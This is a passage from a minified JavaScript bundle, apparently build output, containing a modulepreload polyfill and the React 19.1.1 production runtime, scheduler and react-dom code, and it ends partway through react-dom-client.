(function () {
	const G = document.createElement("link").relList;
	if (G && G.supports && G.supports("modulepreload")) return;
	for (const H of document.querySelectorAll('link[rel="modulepreload"]'))
		h(H);
	new MutationObserver((H) => {
		for (const q of H)
			if (q.type === "childList")
				for (const $ of q.addedNodes)
					$.tagName === "LINK" && $.rel === "modulepreload" && h($);
	}).observe(document, { childList: !0, subtree: !0 });
	function z(H) {
		const q = {};
		return (
			H.integrity && (q.integrity = H.integrity),
			H.referrerPolicy && (q.referrerPolicy = H.referrerPolicy),
			H.crossOrigin === "use-credentials"
				? (q.credentials = "include")
				: H.crossOrigin === "anonymous"
				? (q.credentials = "omit")
				: (q.credentials = "same-origin"),
			q
		);
	}
	function h(H) {
		if (H.ep) return;
		H.ep = !0;
		const q = z(H);
		fetch(H.href, q);
	}
})();
var $i = { exports: {} },
	gu = {};
/**
 * @license React
 * react-jsx-runtime.production.js
 *
 * Copyright (c) Meta Platforms, Inc. and affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */ var Fr;
function _h() {
	if (Fr) return gu;
	Fr = 1;
	var T = Symbol.for("react.transitional.element"),
		G = Symbol.for("react.fragment");
	function z(h, H, q) {
		var $ = null;
		if (
			(q !== void 0 && ($ = "" + q),
			H.key !== void 0 && ($ = "" + H.key),
			"key" in H)
		) {
			q = {};
			for (var bl in H) bl !== "key" && (q[bl] = H[bl]);
		} else q = H;
		return (
			(H = q.ref),
			{
				$$typeof: T,
				type: h,
				key: $,
				ref: H !== void 0 ? H : null,
				props: q,
			}
		);
	}
	return (gu.Fragment = G), (gu.jsx = z), (gu.jsxs = z), gu;
}
var Ir;
function Dh() {
	return Ir || ((Ir = 1), ($i.exports = _h())), $i.exports;
}
var f = Dh(),
	Fi = { exports: {} },
	Q = {};
/**
 * @license React
 * react.production.js
 *
 * Copyright (c) Meta Platforms, Inc. and affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */ var Pr;
function Rh() {
	if (Pr) return Q;
	Pr = 1;
	var T = Symbol.for("react.transitional.element"),
		G = Symbol.for("react.portal"),
		z = Symbol.for("react.fragment"),
		h = Symbol.for("react.strict_mode"),
		H = Symbol.for("react.profiler"),
		q = Symbol.for("react.consumer"),
		$ = Symbol.for("react.context"),
		bl = Symbol.for("react.forward_ref"),
		D = Symbol.for("react.suspense"),
		N = Symbol.for("react.memo"),
		_ = Symbol.for("react.lazy"),
		J = Symbol.iterator;
	function F(o) {
		return o === null || typeof o != "object"
			? null
			: ((o = (J && o[J]) || o["@@iterator"]),
			  typeof o == "function" ? o : null);
	}
	var el = {
			isMounted: function () {
				return !1;
			},
			enqueueForceUpdate: function () {},
			enqueueReplaceState: function () {},
			enqueueSetState: function () {},
		},
		k = Object.assign,
		ol = {};
	function dl(o, j, M) {
		(this.props = o),
			(this.context = j),
			(this.refs = ol),
			(this.updater = M || el);
	}
	(dl.prototype.isReactComponent = {}),
		(dl.prototype.setState = function (o, j) {
			if (typeof o != "object" && typeof o != "function" && o != null)
				throw Error(
					"takes an object of state variables to update or a function which returns an object of state variables."
				);
			this.updater.enqueueSetState(this, o, j, "setState");
		}),
		(dl.prototype.forceUpdate = function (o) {
			this.updater.enqueueForceUpdate(this, o, "forceUpdate");
		});
	function xt() {}
	xt.prototype = dl.prototype;
	function Yl(o, j, M) {
		(this.props = o),
			(this.context = j),
			(this.refs = ol),
			(this.updater = M || el);
	}
	var vl = (Yl.prototype = new xt());
	(vl.constructor = Yl), k(vl, dl.prototype), (vl.isPureReactComponent = !0);
	var ht = Array.isArray,
		I = { H: null, A: null, T: null, S: null, V: null },
		Vl = Object.prototype.hasOwnProperty;
	function Kl(o, j, M, E, U, P) {
		return (
			(M = P.ref),
			{
				$$typeof: T,
				type: o,
				key: j,
				ref: M !== void 0 ? M : null,
				props: P,
			}
		);
	}
	function Jl(o, j) {
		return Kl(o.type, j, void 0, void 0, void 0, o.props);
	}
	function bt(o) {
		return typeof o == "object" && o !== null && o.$$typeof === T;
	}
	function Ue(o) {
		var j = { "=": "=0", ":": "=2" };
		return (
			"$" +
			o.replace(/[=:]/g, function (M) {
				return j[M];
			})
		);
	}
	var At = /\/+/g;
	function Ul(o, j) {
		return typeof o == "object" && o !== null && o.key != null
			? Ue("" + o.key)
			: j.toString(36);
	}
	function me() {}
	function he(o) {
		switch (o.status) {
			case "fulfilled":
				return o.value;
			case "rejected":
				throw o.reason;
			default:
				switch (
					(typeof o.status == "string"
						? o.then(me, me)
						: ((o.status = "pending"),
						  o.then(
								function (j) {
									o.status === "pending" &&
										((o.status = "fulfilled"),
										(o.value = j));
								},
								function (j) {
									o.status === "pending" &&
										((o.status = "rejected"),
										(o.reason = j));
								}
						  )),
					o.status)
				) {
					case "fulfilled":
						return o.value;
					case "rejected":
						throw o.reason;
				}
		}
		throw o;
	}
	function wl(o, j, M, E, U) {
		var P = typeof o;
		(P === "undefined" || P === "boolean") && (o = null);
		var X = !1;
		if (o === null) X = !0;
		else
			switch (P) {
				case "bigint":
				case "string":
				case "number":
					X = !0;
					break;
				case "object":
					switch (o.$$typeof) {
						case T:
						case G:
							X = !0;
							break;
						case _:
							return (X = o._init), wl(X(o._payload), j, M, E, U);
					}
			}
		if (X)
			return (
				(U = U(o)),
				(X = E === "" ? "." + Ul(o, 0) : E),
				ht(U)
					? ((M = ""),
					  X != null && (M = X.replace(At, "$&/") + "/"),
					  wl(U, j, M, "", function (Qt) {
							return Qt;
					  }))
					: U != null &&
					  (bt(U) &&
							(U = Jl(
								U,
								M +
									(U.key == null || (o && o.key === U.key)
										? ""
										: ("" + U.key).replace(At, "$&/") +
										  "/") +
									X
							)),
					  j.push(U)),
				1
			);
		X = 0;
		var kl = E === "" ? "." : E + ":";
		if (ht(o))
			for (var ml = 0; ml < o.length; ml++)
				(E = o[ml]), (P = kl + Ul(E, ml)), (X += wl(E, j, M, P, U));
		else if (((ml = F(o)), typeof ml == "function"))
			for (o = ml.call(o), ml = 0; !(E = o.next()).done; )
				(E = E.value), (P = kl + Ul(E, ml++)), (X += wl(E, j, M, P, U));
		else if (P === "object") {
			if (typeof o.then == "function") return wl(he(o), j, M, E, U);
			throw (
				((j = String(o)),
				Error(
					"Objects are not valid as a React child (found: " +
						(j === "[object Object]"
							? "object with keys {" +
							  Object.keys(o).join(", ") +
							  "}"
							: j) +
						"). If you meant to render a collection of children, use an array instead."
				))
			);
		}
		return X;
	}
	function b(o, j, M) {
		if (o == null) return o;
		var E = [],
			U = 0;
		return (
			wl(o, E, "", "", function (P) {
				return j.call(M, P, U++);
			}),
			E
		);
	}
	function A(o) {
		if (o._status === -1) {
			var j = o._result;
			(j = j()),
				j.then(
					function (M) {
						(o._status === 0 || o._status === -1) &&
							((o._status = 1), (o._result = M));
					},
					function (M) {
						(o._status === 0 || o._status === -1) &&
							((o._status = 2), (o._result = M));
					}
				),
				o._status === -1 && ((o._status = 0), (o._result = j));
		}
		if (o._status === 1) return o._result.default;
		throw o._result;
	}
	var C =
		typeof reportError == "function"
			? reportError
			: function (o) {
					if (
						typeof window == "object" &&
						typeof window.ErrorEvent == "function"
					) {
						var j = new window.ErrorEvent("error", {
							bubbles: !0,
							cancelable: !0,
							message:
								typeof o == "object" &&
								o !== null &&
								typeof o.message == "string"
									? String(o.message)
									: String(o),
							error: o,
						});
						if (!window.dispatchEvent(j)) return;
					} else if (
						typeof process == "object" &&
						typeof process.emit == "function"
					) {
						process.emit("uncaughtException", o);
						return;
					}
					console.error(o);
			  };
	function fl() {}
	return (
		(Q.Children = {
			map: b,
			forEach: function (o, j, M) {
				b(
					o,
					function () {
						j.apply(this, arguments);
					},
					M
				);
			},
			count: function (o) {
				var j = 0;
				return (
					b(o, function () {
						j++;
					}),
					j
				);
			},
			toArray: function (o) {
				return (
					b(o, function (j) {
						return j;
					}) || []
				);
			},
			only: function (o) {
				if (!bt(o))
					throw Error(
						"React.Children.only expected to receive a single React element child."
					);
				return o;
			},
		}),
		(Q.Component = dl),
		(Q.Fragment = z),
		(Q.Profiler = H),
		(Q.PureComponent = Yl),
		(Q.StrictMode = h),
		(Q.Suspense = D),
		(Q.__CLIENT_INTERNALS_DO_NOT_USE_OR_WARN_USERS_THEY_CANNOT_UPGRADE = I),
		(Q.__COMPILER_RUNTIME = {
			__proto__: null,
			c: function (o) {
				return I.H.useMemoCache(o);
			},
		}),
		(Q.cache = function (o) {
			return function () {
				return o.apply(null, arguments);
			};
		}),
		(Q.cloneElement = function (o, j, M) {
			if (o == null)
				throw Error(
					"The argument must be a React element, but you passed " +
						o +
						"."
				);
			var E = k({}, o.props),
				U = o.key,
				P = void 0;
			if (j != null)
				for (X in (j.ref !== void 0 && (P = void 0),
				j.key !== void 0 && (U = "" + j.key),
				j))
					!Vl.call(j, X) ||
						X === "key" ||
						X === "__self" ||
						X === "__source" ||
						(X === "ref" && j.ref === void 0) ||
						(E[X] = j[X]);
			var X = arguments.length - 2;
			if (X === 1) E.children = M;
			else if (1 < X) {
				for (var kl = Array(X), ml = 0; ml < X; ml++)
					kl[ml] = arguments[ml + 2];
				E.children = kl;
			}
			return Kl(o.type, U, void 0, void 0, P, E);
		}),
		(Q.createContext = function (o) {
			return (
				(o = {
					$$typeof: $,
					_currentValue: o,
					_currentValue2: o,
					_threadCount: 0,
					Provider: null,
					Consumer: null,
				}),
				(o.Provider = o),
				(o.Consumer = { $$typeof: q, _context: o }),
				o
			);
		}),
		(Q.createElement = function (o, j, M) {
			var E,
				U = {},
				P = null;
			if (j != null)
				for (E in (j.key !== void 0 && (P = "" + j.key), j))
					Vl.call(j, E) &&
						E !== "key" &&
						E !== "__self" &&
						E !== "__source" &&
						(U[E] = j[E]);
			var X = arguments.length - 2;
			if (X === 1) U.children = M;
			else if (1 < X) {
				for (var kl = Array(X), ml = 0; ml < X; ml++)
					kl[ml] = arguments[ml + 2];
				U.children = kl;
			}
			if (o && o.defaultProps)
				for (E in ((X = o.defaultProps), X))
					U[E] === void 0 && (U[E] = X[E]);
			return Kl(o, P, void 0, void 0, null, U);
		}),
		(Q.createRef = function () {
			return { current: null };
		}),
		(Q.forwardRef = function (o) {
			return { $$typeof: bl, render: o };
		}),
		(Q.isValidElement = bt),
		(Q.lazy = function (o) {
			return {
				$$typeof: _,
				_payload: { _status: -1, _result: o },
				_init: A,
			};
		}),
		(Q.memo = function (o, j) {
			return { $$typeof: N, type: o, compare: j === void 0 ? null : j };
		}),
		(Q.startTransition = function (o) {
			var j = I.T,
				M = {};
			I.T = M;
			try {
				var E = o(),
					U = I.S;
				U !== null && U(M, E),
					typeof E == "object" &&
						E !== null &&
						typeof E.then == "function" &&
						E.then(fl, C);
			} catch (P) {
				C(P);
			} finally {
				I.T = j;
			}
		}),
		(Q.unstable_useCacheRefresh = function () {
			return I.H.useCacheRefresh();
		}),
		(Q.use = function (o) {
			return I.H.use(o);
		}),
		(Q.useActionState = function (o, j, M) {
			return I.H.useActionState(o, j, M);
		}),
		(Q.useCallback = function (o, j) {
			return I.H.useCallback(o, j);
		}),
		(Q.useContext = function (o) {
			return I.H.useContext(o);
		}),
		(Q.useDebugValue = function () {}),
		(Q.useDeferredValue = function (o, j) {
			return I.H.useDeferredValue(o, j);
		}),
		(Q.useEffect = function (o, j, M) {
			var E = I.H;
			if (typeof M == "function")
				throw Error(
					"useEffect CRUD overload is not enabled in this build of React."
				);
			return E.useEffect(o, j);
		}),
		(Q.useId = function () {
			return I.H.useId();
		}),
		(Q.useImperativeHandle = function (o, j, M) {
			return I.H.useImperativeHandle(o, j, M);
		}),
		(Q.useInsertionEffect = function (o, j) {
			return I.H.useInsertionEffect(o, j);
		}),
		(Q.useLayoutEffect = function (o, j) {
			return I.H.useLayoutEffect(o, j);
		}),
		(Q.useMemo = function (o, j) {
			return I.H.useMemo(o, j);
		}),
		(Q.useOptimistic = function (o, j) {
			return I.H.useOptimistic(o, j);
		}),
		(Q.useReducer = function (o, j, M) {
			return I.H.useReducer(o, j, M);
		}),
		(Q.useRef = function (o) {
			return I.H.useRef(o);
		}),
		(Q.useState = function (o) {
			return I.H.useState(o);
		}),
		(Q.useSyncExternalStore = function (o, j, M) {
			return I.H.useSyncExternalStore(o, j, M);
		}),
		(Q.useTransition = function () {
			return I.H.useTransition();
		}),
		(Q.version = "19.1.1"),
		Q
	);
}
var ld;
function ef() {
	return ld || ((ld = 1), (Fi.exports = Rh())), Fi.exports;
}
var mt = ef(),
	Ii = { exports: {} },
	yu = {},
	Pi = { exports: {} },
	lf = {};
/**
 * @license React
 * scheduler.production.js
 *
 * Copyright (c) Meta Platforms, Inc. and affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */ var td;
function Uh() {
	return (
		td ||
			((td = 1),
			(function (T) {
				function G(b, A) {
					var C = b.length;
					b.push(A);
					l: for (; 0 < C; ) {
						var fl = (C - 1) >>> 1,
							o = b[fl];
						if (0 < H(o, A)) (b[fl] = A), (b[C] = o), (C = fl);
						else break l;
					}
				}
				function z(b) {
					return b.length === 0 ? null : b[0];
				}
				function h(b) {
					if (b.length === 0) return null;
					var A = b[0],
						C = b.pop();
					if (C !== A) {
						b[0] = C;
						l: for (
							var fl = 0, o = b.length, j = o >>> 1;
							fl < j;

						) {
							var M = 2 * (fl + 1) - 1,
								E = b[M],
								U = M + 1,
								P = b[U];
							if (0 > H(E, C))
								U < o && 0 > H(P, E)
									? ((b[fl] = P), (b[U] = C), (fl = U))
									: ((b[fl] = E), (b[M] = C), (fl = M));
							else if (U < o && 0 > H(P, C))
								(b[fl] = P), (b[U] = C), (fl = U);
							else break l;
						}
					}
					return A;
				}
				function H(b, A) {
					var C = b.sortIndex - A.sortIndex;
					return C !== 0 ? C : b.id - A.id;
				}
				if (
					((T.unstable_now = void 0),
					typeof performance == "object" &&
						typeof performance.now == "function")
				) {
					var q = performance;
					T.unstable_now = function () {
						return q.now();
					};
				} else {
					var $ = Date,
						bl = $.now();
					T.unstable_now = function () {
						return $.now() - bl;
					};
				}
				var D = [],
					N = [],
					_ = 1,
					J = null,
					F = 3,
					el = !1,
					k = !1,
					ol = !1,
					dl = !1,
					xt = typeof setTimeout == "function" ? setTimeout : null,
					Yl =
						typeof clearTimeout == "function" ? clearTimeout : null,
					vl = typeof setImmediate < "u" ? setImmediate : null;
				function ht(b) {
					for (var A = z(N); A !== null; ) {
						if (A.callback === null) h(N);
						else if (A.startTime <= b)
							h(N), (A.sortIndex = A.expirationTime), G(D, A);
						else break;
						A = z(N);
					}
				}
				function I(b) {
					if (((ol = !1), ht(b), !k))
						if (z(D) !== null) (k = !0), Vl || ((Vl = !0), Ul());
						else {
							var A = z(N);
							A !== null && wl(I, A.startTime - b);
						}
				}
				var Vl = !1,
					Kl = -1,
					Jl = 5,
					bt = -1;
				function Ue() {
					return dl ? !0 : !(T.unstable_now() - bt < Jl);
				}
				function At() {
					if (((dl = !1), Vl)) {
						var b = T.unstable_now();
						bt = b;
						var A = !0;
						try {
							l: {
								(k = !1),
									ol && ((ol = !1), Yl(Kl), (Kl = -1)),
									(el = !0);
								var C = F;
								try {
									t: {
										for (
											ht(b), J = z(D);
											J !== null &&
											!(J.expirationTime > b && Ue());

										) {
											var fl = J.callback;
											if (typeof fl == "function") {
												(J.callback = null),
													(F = J.priorityLevel);
												var o = fl(
													J.expirationTime <= b
												);
												if (
													((b = T.unstable_now()),
													typeof o == "function")
												) {
													(J.callback = o),
														ht(b),
														(A = !0);
													break t;
												}
												J === z(D) && h(D), ht(b);
											} else h(D);
											J = z(D);
										}
										if (J !== null) A = !0;
										else {
											var j = z(N);
											j !== null &&
												wl(I, j.startTime - b),
												(A = !1);
										}
									}
									break l;
								} finally {
									(J = null), (F = C), (el = !1);
								}
								A = void 0;
							}
						} finally {
							A ? Ul() : (Vl = !1);
						}
					}
				}
				var Ul;
				if (typeof vl == "function")
					Ul = function () {
						vl(At);
					};
				else if (typeof MessageChannel < "u") {
					var me = new MessageChannel(),
						he = me.port2;
					(me.port1.onmessage = At),
						(Ul = function () {
							he.postMessage(null);
						});
				} else
					Ul = function () {
						xt(At, 0);
					};
				function wl(b, A) {
					Kl = xt(function () {
						b(T.unstable_now());
					}, A);
				}
				(T.unstable_IdlePriority = 5),
					(T.unstable_ImmediatePriority = 1),
					(T.unstable_LowPriority = 4),
					(T.unstable_NormalPriority = 3),
					(T.unstable_Profiling = null),
					(T.unstable_UserBlockingPriority = 2),
					(T.unstable_cancelCallback = function (b) {
						b.callback = null;
					}),
					(T.unstable_forceFrameRate = function (b) {
						0 > b || 125 < b
							? console.error(
									"forceFrameRate takes a positive int between 0 and 125, forcing frame rates higher than 125 fps is not supported"
							  )
							: (Jl = 0 < b ? Math.floor(1e3 / b) : 5);
					}),
					(T.unstable_getCurrentPriorityLevel = function () {
						return F;
					}),
					(T.unstable_next = function (b) {
						switch (F) {
							case 1:
							case 2:
							case 3:
								var A = 3;
								break;
							default:
								A = F;
						}
						var C = F;
						F = A;
						try {
							return b();
						} finally {
							F = C;
						}
					}),
					(T.unstable_requestPaint = function () {
						dl = !0;
					}),
					(T.unstable_runWithPriority = function (b, A) {
						switch (b) {
							case 1:
							case 2:
							case 3:
							case 4:
							case 5:
								break;
							default:
								b = 3;
						}
						var C = F;
						F = b;
						try {
							return A();
						} finally {
							F = C;
						}
					}),
					(T.unstable_scheduleCallback = function (b, A, C) {
						var fl = T.unstable_now();
						switch (
							(typeof C == "object" && C !== null
								? ((C = C.delay),
								  (C =
										typeof C == "number" && 0 < C
											? fl + C
											: fl))
								: (C = fl),
							b)
						) {
							case 1:
								var o = -1;
								break;
							case 2:
								o = 250;
								break;
							case 5:
								o = 1073741823;
								break;
							case 4:
								o = 1e4;
								break;
							default:
								o = 5e3;
						}
						return (
							(o = C + o),
							(b = {
								id: _++,
								callback: A,
								priorityLevel: b,
								startTime: C,
								expirationTime: o,
								sortIndex: -1,
							}),
							C > fl
								? ((b.sortIndex = C),
								  G(N, b),
								  z(D) === null &&
										b === z(N) &&
										(ol ? (Yl(Kl), (Kl = -1)) : (ol = !0),
										wl(I, C - fl)))
								: ((b.sortIndex = o),
								  G(D, b),
								  k ||
										el ||
										((k = !0), Vl || ((Vl = !0), Ul()))),
							b
						);
					}),
					(T.unstable_shouldYield = Ue),
					(T.unstable_wrapCallback = function (b) {
						var A = F;
						return function () {
							var C = F;
							F = A;
							try {
								return b.apply(this, arguments);
							} finally {
								F = C;
							}
						};
					});
			})(lf)),
		lf
	);
}
var ed;
function wh() {
	return ed || ((ed = 1), (Pi.exports = Uh())), Pi.exports;
}
var tf = { exports: {} },
	ql = {};
/**
 * @license React
 * react-dom.production.js
 *
 * Copyright (c) Meta Platforms, Inc. and affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */ var ad;
function Hh() {
	if (ad) return ql;
	ad = 1;
	var T = ef();
	function G(D) {
		var N = "https://react.dev/errors/" + D;
		if (1 < arguments.length) {
			N += "?args[]=" + encodeURIComponent(arguments[1]);
			for (var _ = 2; _ < arguments.length; _++)
				N += "&args[]=" + encodeURIComponent(arguments[_]);
		}
		return (
			"Minified React error #" +
			D +
			"; visit " +
			N +
			" for the full message or use the non-minified dev environment for full errors and additional helpful warnings."
		);
	}
	function z() {}
	var h = {
			d: {
				f: z,
				r: function () {
					throw Error(G(522));
				},
				D: z,
				C: z,
				L: z,
				m: z,
				X: z,
				S: z,
				M: z,
			},
			p: 0,
			findDOMNode: null,
		},
		H = Symbol.for("react.portal");
	function q(D, N, _) {
		var J =
			3 < arguments.length && arguments[3] !== void 0
				? arguments[3]
				: null;
		return {
			$$typeof: H,
			key: J == null ? null : "" + J,
			children: D,
			containerInfo: N,
			implementation: _,
		};
	}
	var $ = T.__CLIENT_INTERNALS_DO_NOT_USE_OR_WARN_USERS_THEY_CANNOT_UPGRADE;
	function bl(D, N) {
		if (D === "font") return "";
		if (typeof N == "string") return N === "use-credentials" ? N : "";
	}
	return (
		(ql.__DOM_INTERNALS_DO_NOT_USE_OR_WARN_USERS_THEY_CANNOT_UPGRADE = h),
		(ql.createPortal = function (D, N) {
			var _ =
				2 < arguments.length && arguments[2] !== void 0
					? arguments[2]
					: null;
			if (
				!N ||
				(N.nodeType !== 1 && N.nodeType !== 9 && N.nodeType !== 11)
			)
				throw Error(G(299));
			return q(D, N, null, _);
		}),
		(ql.flushSync = function (D) {
			var N = $.T,
				_ = h.p;
			try {
				if ((($.T = null), (h.p = 2), D)) return D();
			} finally {
				($.T = N), (h.p = _), h.d.f();
			}
		}),
		(ql.preconnect = function (D, N) {
			typeof D == "string" &&
				(N
					? ((N = N.crossOrigin),
					  (N =
							typeof N == "string"
								? N === "use-credentials"
									? N
									: ""
								: void 0))
					: (N = null),
				h.d.C(D, N));
		}),
		(ql.prefetchDNS = function (D) {
			typeof D == "string" && h.d.D(D);
		}),
		(ql.preinit = function (D, N) {
			if (typeof D == "string" && N && typeof N.as == "string") {
				var _ = N.as,
					J = bl(_, N.crossOrigin),
					F = typeof N.integrity == "string" ? N.integrity : void 0,
					el =
						typeof N.fetchPriority == "string"
							? N.fetchPriority
							: void 0;
				_ === "style"
					? h.d.S(
							D,
							typeof N.precedence == "string"
								? N.precedence
								: void 0,
							{ crossOrigin: J, integrity: F, fetchPriority: el }
					  )
					: _ === "script" &&
					  h.d.X(D, {
							crossOrigin: J,
							integrity: F,
							fetchPriority: el,
							nonce:
								typeof N.nonce == "string" ? N.nonce : void 0,
					  });
			}
		}),
		(ql.preinitModule = function (D, N) {
			if (typeof D == "string")
				if (typeof N == "object" && N !== null) {
					if (N.as == null || N.as === "script") {
						var _ = bl(N.as, N.crossOrigin);
						h.d.M(D, {
							crossOrigin: _,
							integrity:
								typeof N.integrity == "string"
									? N.integrity
									: void 0,
							nonce:
								typeof N.nonce == "string" ? N.nonce : void 0,
						});
					}
				} else N == null && h.d.M(D);
		}),
		(ql.preload = function (D, N) {
			if (
				typeof D == "string" &&
				typeof N == "object" &&
				N !== null &&
				typeof N.as == "string"
			) {
				var _ = N.as,
					J = bl(_, N.crossOrigin);
				h.d.L(D, _, {
					crossOrigin: J,
					integrity:
						typeof N.integrity == "string" ? N.integrity : void 0,
					nonce: typeof N.nonce == "string" ? N.nonce : void 0,
					type: typeof N.type == "string" ? N.type : void 0,
					fetchPriority:
						typeof N.fetchPriority == "string"
							? N.fetchPriority
							: void 0,
					referrerPolicy:
						typeof N.referrerPolicy == "string"
							? N.referrerPolicy
							: void 0,
					imageSrcSet:
						typeof N.imageSrcSet == "string"
							? N.imageSrcSet
							: void 0,
					imageSizes:
						typeof N.imageSizes == "string" ? N.imageSizes : void 0,
					media: typeof N.media == "string" ? N.media : void 0,
				});
			}
		}),
		(ql.preloadModule = function (D, N) {
			if (typeof D == "string")
				if (N) {
					var _ = bl(N.as, N.crossOrigin);
					h.d.m(D, {
						as:
							typeof N.as == "string" && N.as !== "script"
								? N.as
								: void 0,
						crossOrigin: _,
						integrity:
							typeof N.integrity == "string"
								? N.integrity
								: void 0,
					});
				} else h.d.m(D);
		}),
		(ql.requestFormReset = function (D) {
			h.d.r(D);
		}),
		(ql.unstable_batchedUpdates = function (D, N) {
			return D(N);
		}),
		(ql.useFormState = function (D, N, _) {
			return $.H.useFormState(D, N, _);
		}),
		(ql.useFormStatus = function () {
			return $.H.useHostTransitionStatus();
		}),
		(ql.version = "19.1.1"),
		ql
	);
}
var ud;
function Bh() {
	if (ud) return tf.exports;
	ud = 1;
	function T() {
		if (
			!(
				typeof __REACT_DEVTOOLS_GLOBAL_HOOK__ > "u" ||
				typeof __REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE != "function"
			)
		)
			try {
				__REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE(T);
			} catch (G) {
				console.error(G);
			}
	}
	return T(), (tf.exports = Hh()), tf.exports;
}
/**
 * @license React
 * react-dom-client.production.js
 *
 * Copyright (c) Meta Platforms, Inc. and affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */ var nd;
function qh() {
	if (nd) return yu;
	nd = 1;
	var T = wh(),
		G = ef(),
		z = Bh();
	function h(l) {
		var t = "https://react.dev/errors/" + l;
		if (1 < arguments.length) {
			t += "?args[]=" + encodeURIComponent(arguments[1]);
			for (var e = 2; e < arguments.length; e++)
				t += "&args[]=" + encodeURIComponent(arguments[e]);
		}
		return (
			"Minified React error #" +
			l +
			"; visit " +
			t +
			" for the full message or use the non-minified dev environment for full errors and additional helpful warnings."
		);
	}
	function H(l) {
		return !(
			!l ||
			(l.nodeType !== 1 && l.nodeType !== 9 && l.nodeType !== 11)
		);
	}
	function q(l) {
		var t = l,
			e = l;
		if (l.alternate) for (; t.return; ) t = t.return;
		else {
			l = t;
			do
				(t = l),
					(t.flags & 4098) !== 0 && (e = t.return),
					(l = t.return);
			while (l);
		}
		return t.tag === 3 ? e : null;
	}
	function $(l) {
		if (l.tag === 13) {
			var t = l.memoizedState;
			if (
				(t === null &&
					((l = l.alternate), l !== null && (t = l.memoizedState)),
				t !== null)
			)
				return t.dehydrated;
		}
		return null;
	}
	function bl(l) {
		if (q(l) !== l) throw Error(h(188));
	}
	function D(l) {
		var t = l.alternate;
		if (!t) {
			if (((t = q(l)), t === null)) throw Error(h(188));
			return t !== l ? null : l;
		}
		for (var e = l, a = t; ; ) {
			var u = e.return;
			if (u === null) break;
			var n = u.alternate;
			if (n === null) {
				if (((a = u.return), a !== null)) {
					e = a;
					continue;
				}
				break;
			}
			if (u.child === n.child) {
				for (n = u.child; n; ) {
					if (n === e) return bl(u), l;
					if (n === a) return bl(u), t;
					n = n.sibling;
				}
				throw Error(h(188));
			}
			if (e.return !== a.return) (e = u), (a = n);
			else {
				for (var c = !1, i = u.child; i; ) {
					if (i === e) {
						(c = !0), (e = u), (a = n);
						break;
					}
					if (i === a) {
						(c = !0), (a = u), (e = n);
						break;
					}
					i = i.sibling;
				}
				if (!c) {
					for (i = n.child; i; ) {
						if (i === e) {
							(c = !0), (e = n), (a = u);
							break;
						}
						if (i === a) {
							(c = !0), (a = n), (e = u);
							break;
						}
						i = i.sibling;
					}
					if (!c) throw Error(h(189));
				}
			}
			if (e.alternate !== a) throw Error(h(190));
		}
		if (e.tag !== 3) throw Error(h(188));
		return e.stateNode.current === e ? l : t;
	}
	function N(l) {
		var t = l.tag;
		if (t === 5 || t === 26 || t === 27 || t === 6) return l;
		for (l = l.child; l !== null; ) {
			if (((t = N(l)), t !== null)) return t;
			l = l.sibling;
		}
		return null;
	}
	var _ = Object.assign,
		J = Symbol.for("react.element"),
		F = Symbol.for("react.transitional.element"),
		el = Symbol.for("react.portal"),
		k = Symbol.for("react.fragment"),
		ol = Symbol.for("react.strict_mode"),
		dl = Symbol.for("react.profiler"),
		xt = Symbol.for("react.provider"),
		Yl = Symbol.for("react.consumer"),
		vl = Symbol.for("react.context"),
		ht = Symbol.for("react.forward_ref"),
		I = Symbol.for("react.suspense"),
		Vl = Symbol.for("react.suspense_list"),
		Kl = Symbol.for("react.memo"),
		Jl = Symbol.for("react.lazy"),
		bt = Symbol.for("react.activity"),
		Ue = Symbol.for("react.memo_cache_sentinel"),
		At = Symbol.iterator;
	function Ul(l) {
		return l === null || typeof l != "object"
			? null
			: ((l = (At && l[At]) || l["@@iterator"]),
			  typeof l == "function" ? l : null);
	}
	var me = Symbol.for("react.client.reference");
	function he(l) {
		if (l == null) return null;
		if (typeof l == "function")
			return l.$$typeof === me ? null : l.displayName || l.name || null;
		if (typeof l == "string") return l;
		switch (l) {
			case k:
				return "Fragment";
			case dl:
				return "Profiler";
			case ol:
				return "StrictMode";
			case I:
				return "Suspense";
			case Vl:
				return "SuspenseList";
			case bt:
				return "Activity";
		}
		if (typeof l == "object")
			switch (l.$$typeof) {
				case el:
					return "Portal";
				case vl:
					return (l.displayName || "Context") + ".Provider";
				case Yl:
					return (l._context.displayName || "Context") + ".Consumer";
				case ht:
					var t = l.render;
					return (
						(l = l.displayName),
						l ||
							((l = t.displayName || t.name || ""),
							(l =
								l !== ""
									? "ForwardRef(" + l + ")"
									: "ForwardRef")),
						l
					);
				case Kl:
					return (
						(t = l.displayName || null),
						t !== null ? t : he(l.type) || "Memo"
					);
				case Jl:
					(t = l._payload), (l = l._init);
					try {
						return he(l(t));
					} catch {}
			}
		return null;
	}
	var wl = Array.isArray,
		b = G.__CLIENT_INTERNALS_DO_NOT_USE_OR_WARN_USERS_THEY_CANNOT_UPGRADE,
		A = z.__DOM_INTERNALS_DO_NOT_USE_OR_WARN_USERS_THEY_CANNOT_UPGRADE,
		C = { pending: !1, data: null, method: null, action: null },
		fl = [],
		o = -1;
	function j(l) {
		return { current: l };
	}
	function M(l) {
		0 > o || ((l.current = fl[o]), (fl[o] = null), o--);
	}
	function E(l, t) {
		o++, (fl[o] = l.current), (l.current = t);
	}
	var U = j(null),
		P = j(null),
		X = j(null),
		kl = j(null);
	function ml(l, t) {
		switch ((E(X, t), E(P, l), E(U, null), t.nodeType)) {
			case 9:
			case 11:
				l = (l = t.documentElement) && (l = l.namespaceURI) ? Er(l) : 0;
				break;
			default:
				if (((l = t.tagName), (t = t.namespaceURI)))
					(t = Er(t)), (l = Ar(t, l));
				else
					switch (l) {
						case "svg":
							l = 1;
							break;
						case "math":
							l = 2;
							break;
						default:
							l = 0;
					}
		}
		M(U), E(U, l);
	}
	function Qt() {
		M(U), M(P), M(X);
	}
	function Hn(l) {
		l.memoizedState !== null && E(kl, l);
		var t = U.current,
			e = Ar(t, l.type);
		t !== e && (E(P, l), E(U, e));
	}
	function bu(l) {
		P.current === l && (M(U), M(P)),
			kl.current === l && (M(kl), (ru._currentValue = C));
	}
